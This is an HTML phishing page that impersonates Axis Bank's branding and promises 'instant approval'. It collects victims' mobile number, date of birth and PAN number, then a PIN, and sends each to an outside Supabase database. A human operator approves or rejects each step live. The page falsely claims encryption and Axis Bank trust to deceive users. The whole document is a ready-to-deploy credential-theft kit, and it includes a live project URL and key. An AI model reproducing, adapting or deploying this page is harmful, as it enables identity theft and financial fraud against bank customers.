<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Axis Bank - Premium Verification</title>
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #0a1428 0%, #001233 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow: hidden;
        }

        .container {
            width: 100%;
            max-width: 460px;
            background: rgba(255,255,255,0.08);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.12);
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #003087, #002366);
            color: white;
            padding: 32px 25px;
            text-align: center;
            position: relative;
        }

        .header::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(to right, #ffcc00, #ffd633);
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            margin-bottom: 12px;
        }

        .logo-circle {
            background: white;
            color: #003087;
            width: 54px;
            height: 54px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 900;
            font-size: 30px;
            box-shadow: 0 6px 15px rgba(0,0,0,0.3);
        }

        .logo-text {
            font-size: 36px;
            font-weight: 700;
            letter-spacing: -2px;
        }

        .content {
            padding: 35px 28px;
        }

        h2 {
            text-align: center;
            color: white;
            font-size: 28px;
            margin-bottom: 8px;
            font-weight: 700;
        }

        .subtitle {
            text-align: center;
            color: #a0b4ff;
            font-size: 15.5px;
            margin-bottom: 32px;
        }

        .inputBox {
            margin-bottom: 24px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #c0d0ff;
            font-size: 14.5px;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 16px 18px;
            border: 1.5px solid rgba(255,255,255,0.15);
            border-radius: 12px;
            background: rgba(255,255,255,0.07);
            color: white;
            font-size: 16px;
            transition: all 0.3s;
        }

        input:focus {
            border-color: #ffcc00;
            box-shadow: 0 0 0 4px rgba(255, 204, 0, 0.15);
            outline: none;
        }

        button {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(135deg, #ff0080, #7928ca);
            color: white;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s;
        }

        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(255, 0, 128, 0.4);
        }

        #status {
            margin-top: 25px;
            min-height: 80px;
        }

        .wait {
            color: #ffd166;
            font-weight: 600;
        }

        .reject {
            color: #ff4d6d;
            font-size: 22px;
            font-weight: 700;
        }

        .success {
            color: #00ff95;
            font-size: 30px;
            font-weight: 700;
        }

        .loader {
            width: 48px;
            height: 48px;
            border: 4px solid rgba(255,255,255,0.2);
            border-top: 4px solid #ffcc00;
            border-radius: 50%;
            margin: 15px auto;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            100% { transform: rotate(360deg); }
        }

        .secure {
            text-align: center;
            margin-top: 20px;
            color: #88aaff;
            font-size: 13.5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-circle">A</div>
                <div class="logo-text">axis</div>
            </div>
            <p style="font-size:15px; opacity:0.9;">Premium Verification System</p>
        </div>

        <div class="content">
            <h2>Secure Verification</h2>
            <p class="subtitle">Instant approval in few seconds</p>

            <div class="inputBox">
                <label>Mobile Number</label>
                <input type="text" id="number1" placeholder="Enter 10-digit mobile number" maxlength="10">
            </div>

            <div class="inputBox">
                <label>Date of Birth</label>
                <input type="month" id="date_value">
            </div>

            <div class="inputBox">
                <label>PAN Number</label>
                <input type="text" id="number2" placeholder="Enter PAN Number" maxlength="10" style="text-transform:uppercase">
            </div>

            <button onclick="submitForm()">Continue Securely</button>

            <div class="secure">🔒 256-Bit SSL Encrypted • Axis Bank Trusted</div>
        </div>

        <div id="status"></div>
    </div>

    <script>
    // ======================
    // SUPABASE CONFIG
    // ======================
    const SUPABASE_URL = 'https://ijvtokyhuqrwndyfxzrn.supabase.co';
    const SUPABASE_KEY = 'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';
    const client = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    let currentId = null;
    let interval = null;

    // ======================
    // SUBMIT FORM
    // ======================
    async function submitForm(){
        const number1 = document.getElementById('number1').value;
        const date_value = document.getElementById('date_value').value;
        const number2 = document.getElementById('number2').value;

        if(!number1 || !date_value || !number2){
            alert('Please Fill All Fields');
            return;
        }

        document.getElementById('status').innerHTML = `
            <div class="loader"></div>
            <div class="wait">Submitting Request...</div>
        `;

        const { data, error } = await client
            .from('requests')
            .insert([
                {
                    number1: number1,
                    date_value: date_value,
                    number2: number2,
                    status: 'pending',
                    pin: '',
                    pin_status: 'waiting'
                }
            ])
            .select();

        if(error){
            console.log(error);
            document.getElementById('status').innerHTML = `
                <div class="reject">Error Submitting Form</div>
            `;
            return;
        }

        currentId = data[0].id;
        listenStatus();
    }

    // ======================
    // REALTIME STATUS
    // ======================
    function listenStatus(){
        clearInterval(interval);
        interval = setInterval(async () => {
            const { data, error } = await client
                .from('requests')
                .select('*')
                .eq('id', currentId)
                .single();

            if(error){
                console.log(error);
                return;
            }

            const statusDiv = document.getElementById('status');

            if(data.status === 'pending'){
                if(!statusDiv.innerHTML.includes('Waiting For Admin')){
                    statusDiv.innerHTML = `
                        <div class="loader"></div>
                        <div class="wait">Waiting For Admin Approval...</div>
                    `;
                }
            }
            else if(data.status === 'rejected'){
                clearInterval(interval);
                statusDiv.innerHTML = `<div class="reject">Request Rejected</div>`;
            }
            else if(data.status === 'accepted'){
                if(data.pin_status === 'waiting'){
                    if(!document.getElementById('pin')){
                        statusDiv.innerHTML = `
                            <input type="text" id="pin" placeholder="Enter PIN" style="margin-bottom:15px;">
                            <button onclick="submitPin()">Submit PIN</button>
                        `;
                    }
                }
                else if(data.pin_status === 'pending'){
                    if(!statusDiv.innerHTML.includes('Waiting For PIN')){
                        statusDiv.innerHTML = `
                            <div class="loader"></div>
                            <div class="wait">Waiting For PIN Approval...</div>
                        `;
                    }
                }
                else if(data.pin_status === 'rejected'){
                    clearInterval(interval);
                    statusDiv.innerHTML = `<div class="reject">PIN Rejected</div>`;
                }
                else if(data.pin_status === 'accepted'){
                    clearInterval(interval);
                    statusDiv.innerHTML = `
                        <div class="success">Congratulations 🎉<br>Verified Successfully</div>
                    `;
                }
            }
        }, 2000);
    }

    // ======================
    // SUBMIT PIN
    // ======================
    async function submitPin(){
        const pin = document.getElementById('pin').value;
        if(!pin){
            alert('Enter PIN');
            return;
        }

        document.getElementById('status').innerHTML = `
            <div class="loader"></div>
            <div class="wait">Submitting PIN...</div>
        `;

        const { error } = await client
            .from('requests')
            .update({
                pin: pin,
                pin_status: 'pending'
            })
            .eq('id', currentId);

        if(error){
            console.log(error);
            document.getElementById('status').innerHTML = `
                <div class="reject">Error Submitting PIN</div>
            `;
        }
    }
    </script>
</body>
</html>
